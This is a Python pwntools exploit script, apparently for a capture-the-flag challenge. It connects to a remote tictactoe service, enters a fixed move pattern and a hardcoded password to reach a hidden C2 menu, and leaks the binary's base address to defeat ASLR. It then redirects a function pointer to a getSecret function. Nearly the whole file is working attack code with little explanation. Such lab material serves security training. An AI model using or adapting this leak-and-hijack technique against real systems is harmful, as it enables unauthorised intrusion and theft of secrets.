#!/usr/bin/python3
from pwn import *

exe = ELF("./tictactoe_debug_patched")
c2_exe = ELF("C2_executable")
context.binary = exe

context.terminal = ['tmux', 'splitw', '-h']
# context.log_level 	= "WARNING"
context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

##### gs for C2_executable binary ONLY
gs = r"""
set follow-fork-mode child
set detach-on-fork off
set follow-exec-mode new
catch exec
catch fork
catch vfork
set breakpoint pending on

# Optionally break where the C2 starts talking:
# break *main  # for the first binary
# After exec, you can add a breakpoint by name in the new image:
# (GDB will resolve once the new file is loaded thanks to 'pending on')
break processInput
brva 0x000000000000141F
disable
continue
"""
# io = gdb.debug([exe.path], gdbscript=gs)

# gs = '''
# brva 0x0000000000001752
# continue
# '''.format(**locals())
##### gs for C2_executable binary ONLY

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)

	
def play_turn(row, col):
	io.sendlineafter(b": ", str(row).encode() + " ".encode() + str(col).encode()) # Row and Column

def enter_username(username):
	io.sendlineafter(b": ", username)

def enter_password(password):
	io.sendlineafter(b": ", password) 



####### C2_executable functions

def leak_binary_base():
	io.sendlineafter(b"> ", b"h")
	result = io.recvline()
	value = result.split(b"0x")
	binary_leak = int(value[1], 16)
	binary_base = binary_leak - 0x143c
	return binary_base

def call_exit():
	io.sendlineafter(b"> ", b"e")
	io.sendlineafter(b"? ", b"Y")
	io.recvline()

def call_hack_update(addressToGoTo):
	io.sendlineafter(b"> ", b"f")
	main_address = p64(addressToGoTo)
	io.sendafter(b"? ", main_address)
	
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.57.211:38705"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 0.5

################ Enter pattern to reach C2
play_turn(0, 0)
play_turn(0, 4)
play_turn(1, 1)
play_turn(1, 3)
play_turn(2, 2)
play_turn(3, 1)
play_turn(3, 3)
play_turn(4, 0)
play_turn(4, 4)
enter_username(b"some_user_name")
enter_password(b"D3f1n3tlya71c74c703gam3")
################ Enter pattern to reach C2

# io.interactive()

context.binary = c2_exe
sleep(1)
binary_base = leak_binary_base()
c2_exe.address = binary_base
print_result(f"Leaked binary base: {hex(binary_base)}")

call_exit()
# input("Press enter to continue...")
beginsession_puts = 0x0000000000001540
create_account_free = 0x00000000000013C7 
create_user_call = 0x000000000000180B
get_secret = c2_exe.symbols['getSecret']
call_hack_update(get_secret)

io.interactive()





